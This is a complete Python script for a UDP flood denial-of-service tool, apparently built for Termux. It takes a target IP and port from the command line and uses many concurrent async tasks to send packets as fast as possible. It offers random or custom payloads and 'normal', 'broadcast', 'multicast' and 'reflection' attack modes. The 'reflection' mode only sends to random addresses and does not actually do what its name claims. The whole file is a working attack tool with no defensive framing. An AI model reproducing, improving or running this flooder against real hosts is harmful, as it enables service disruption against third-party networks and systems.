import asyncio
import socket
import os
import struct
import argparse
import logging
import signal
import time
import random
import sys
from datetime import datetime

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("UDPFlooder")

# --- UDP Flooder Class ---
class UDPFlooder:
    def __init__(self, ip, port, packet_size=1024, delay=0, mode='normal',
                 payload_mode='random', custom_payload=None, use_ipv6=False, concurrency=10):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.delay = delay
        self.mode = mode
        self.payload_mode = payload_mode
        self.custom_payload = custom_payload
        self.use_ipv6 = use_ipv6
        self.concurrency = concurrency

        self.packet_counter = 0
        self.start_time = time.time()
        self.stop_event = asyncio.Event()
        self.lock = asyncio.Lock()
        self.stats_task = None

    def generate_payload(self):
        if self.payload_mode == 'random':
            return os.urandom(self.packet_size)
        elif self.payload_mode == 'pattern':
            pattern = b'\x00\xFF' * (self.packet_size // 2)
            return pattern[:self.packet_size]
        else:
            if self.custom_payload:
                base = self.custom_payload.encode('utf-8', 'ignore')
                return (base * (self.packet_size // len(base) + 1))[:self.packet_size]
            else:
                return os.urandom(self.packet_size)

    async def send_packets(self, task_id):
        family = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET
        
        try:
            sock = socket.socket(family, socket.SOCK_DGRAM)
            sock.setblocking(False)
        except OSError as e:
            logger.error(f"[Task {task_id}] Socket creation failed: {e}")
            return

        # Modus-spezifische Einstellungen
        if self.mode == 'broadcast':
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            except OSError:
                pass
            target = ('255.255.255.255', self.port)
        elif self.mode == 'multicast':
            try:
                ttl = struct.pack('b', 1)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
            except OSError:
                pass
            target = (self.ip, self.port)
        elif self.mode == 'reflection':
            target = None
        else:
            target = (self.ip, self.port)

        loop = asyncio.get_running_loop()
        payload = self.generate_payload()

        try:
            while not self.stop_event.is_set():
                try:
                    if self.mode == 'reflection':
                        # Random source port simulation
                        src_port = random.randint(1024, 65535)
                        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                        await loop.sock_sendto(sock, payload, (fake_ip, src_port))
                    else:
                        await loop.sock_sendto(sock, payload, target)
                    
                    async with self.lock:
                        self.packet_counter += 1
                    
                    if self.delay > 0:
                        await asyncio.sleep(self.delay)
                except (OSError, asyncio.CancelledError) as e:
                    logger.error(f"[Task {task_id}] Send error: {e}")
                    await asyncio.sleep(0.1)
        finally:
            sock.close()

    async def show_stats(self):
        while not self.stop_event.is_set():
            elapsed = time.time() - self.start_time
            pps = self.packet_counter / elapsed if elapsed > 0 else 0
            sys.stdout.write(
                f"\r[STATS] Packets: {self.packet_counter} | "
                f"Elapsed: {elapsed:.1f}s | PPS: {pps:.1f}       "
            )
            sys.stdout.flush()
            await asyncio.sleep(1)

    async def start(self):
        logger.info(f"Starting flooder: {self.ip}:{self.port}")
        logger.info(f"Mode: {self.mode} | Payload: {self.payload_mode} | Threads: {self.concurrency}")
        logger.info(f"Packet size: {self.packet_size} bytes | Delay: {self.delay}s")
        logger.info("Press CTRL+C to stop...\n")
        
        self.start_time = time.time()
        self.stop_event.clear()
        self.packet_counter = 0
        
        tasks = []
        for i in range(self.concurrency):
            task = asyncio.create_task(self.send_packets(i+1))
            tasks.append(task)
        
        self.stats_task = asyncio.create_task(self.show_stats())
        
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        finally:
            self.stop()

    def stop(self):
        if not self.stop_event.is_set():
            self.stop_event.set()
            if self.stats_task:
                self.stats_task.cancel()
            elapsed = time.time() - self.start_time
            pps = self.packet_counter / elapsed if elapsed > 0 else 0
            print("\n\n[SUMMARY]")
            logger.info(f"Total packets sent: {self.packet_counter}")
            logger.info(f"Duration: {elapsed:.2f} seconds")
            logger.info(f"Average PPS: {pps:.1f}")

# --- Signal Handler ---
def handle_sigint(signum, frame):
    logger.info("\nCTRL+C detected. Stopping flooder...")
    global flooder
    if flooder:
        flooder.stop()
    sys.exit(0)

# --- Argument Parser ---
def parse_args():
    parser = argparse.ArgumentParser(description="UDP Flooder - Termux Optimized")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("-s", "--size", type=int, default=1024, help="UDP packet size in bytes (default: 1024)")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between packets in seconds (default: 0)")
    parser.add_argument("-m", "--mode", choices=['normal', 'broadcast', 'multicast', 'reflection'], 
                        default='normal', help="Attack mode (default: normal)")
    parser.add_argument("-p", "--payload", choices=['random', 'pattern', 'custom'], 
                        default='random', help="Payload mode (default: random)")
    parser.add_argument("-c", "--custom", default=None, help="Custom payload text (only for payload-mode=custom)")
    parser.add_argument("-6", "--ipv6", action='store_true', help="Use IPv6 (default: IPv4)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent tasks (default: 10)")
    return parser.parse_args()

# --- Main Function ---
async def main():
    global flooder
    args = parse_args()
    
    flooder = UDPFlooder(
        ip=args.ip,
        port=args.port,
        packet_size=args.size,
        delay=args.delay,
        mode=args.mode,
        payload_mode=args.payload,
        custom_payload=args.custom,
        use_ipv6=args.ipv6,
        concurrency=args.threads
    )
    
    signal.signal(signal.SIGINT, handle_sigint)
    
    try:
        await flooder.start()
    except asyncio.CancelledError:
        pass

if __name__ == "__main__":
    flooder = None
    asyncio.run(main())
